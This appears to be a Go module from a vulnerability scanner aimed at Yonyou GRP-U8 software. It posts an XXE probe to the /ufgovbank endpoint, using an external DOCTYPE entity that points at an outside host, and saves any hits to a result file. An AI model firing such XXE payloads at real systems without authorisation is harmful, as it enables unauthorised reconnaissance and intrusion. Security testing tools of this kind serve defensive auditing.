package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func UfgovbankScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	const ufgovbank = "用友 GRP-U8 ufgovbank XXE漏洞"
	urls := address + "/ufgovbank"

	// 设置客户端超时
	originalTimeout := client.Timeout
	client.Timeout = 8 * time.Second
	defer func() { client.Timeout = originalTimeout }()

	// 发送 POST 请求
	response, err := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader(`reqData=<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://www.baidu.com">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest`))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, ufgovbank)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, ufgovbank)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Red+"x"+Reset+"] %s 读取响应失败: %v", currentTime, ufgovbank, err)
		fmt.Println(output)
		return
	}

	// 检查漏洞是否存在
	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "ufgov") || strings.Contains(string(body), "lineNumber") {
		result := ufgovbank + "：" + urls
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, ufgovbank, urls)
		fmt.Println(output)

		// 保存结果到文件
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		if err := Utils.SaveResultToFile(result, filename); err != nil {
			log.Printf("保存结果到文件出错: %v", err)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, ufgovbank, response.StatusCode)
		fmt.Println(output)
	}
}
